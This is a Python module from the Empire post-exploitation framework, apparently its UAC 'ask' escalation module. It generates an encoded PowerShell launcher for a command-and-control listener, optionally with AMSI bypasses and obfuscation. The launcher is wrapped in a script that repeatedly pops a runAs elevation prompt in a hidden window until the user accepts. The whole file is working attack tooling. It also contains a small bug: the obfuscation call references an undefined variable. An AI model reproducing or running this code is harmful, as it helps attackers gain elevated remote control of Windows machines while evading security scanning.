from __future__ import print_function

from builtins import str
from builtins import object
from empire.server.common import helpers
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        # Set booleans to false by default
        obfuscate = False
        amsi_bypass = False
        amsi_bypass2 = False

        listener_name = params['Listener']

        # staging options
        user_agent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']
        if (params['Obfuscate']).lower() == 'true':
            obfuscate = True
        obfuscate_command = params['ObfuscateCommand']
        if (params['AMSIBypass']).lower() == 'true':
            amsi_bypass = True
        if (params['AMSIBypass2']).lower() == 'true':
            amsi_bypass2 = True

        if not main_menu.listeners.is_listener_valid(listener_name):
            # not a valid listener, return nothing for the script
            print(helpers.color("[!] Invalid listener: " + listener_name))
            return ""
        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True, obfuscate=obfuscate,
                                                               obfuscationCommand=obfuscate_command,userAgent=user_agent, proxy=proxy,
                                                               proxyCreds=proxy_creds, AMSIBypass=amsi_bypass, AMSIBypass2=amsi_bypass2)

            if launcher == "":
                print(helpers.color("[!] Error in launcher generation."))
                return ""
            else:
                enc_launcher = " ".join(launcher.split(" ")[1:])

                script = '''
if( ($(whoami /groups) -like "*S-1-5-32-544*").length -eq 1) {
    while($True) {
        try {
            Start-Process "powershell" -ArgumentList "%s" -Verb runAs -WindowStyle hidden
            "[*] Successfully elevated!"
            break
        }
        catch {}
    }
}
else  {
    "[!] User is not a local administrator!"
}
''' %(enc_launcher)

        if obfuscate:
            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
        script = helpers.keyword_obfuscation(script)

        return script
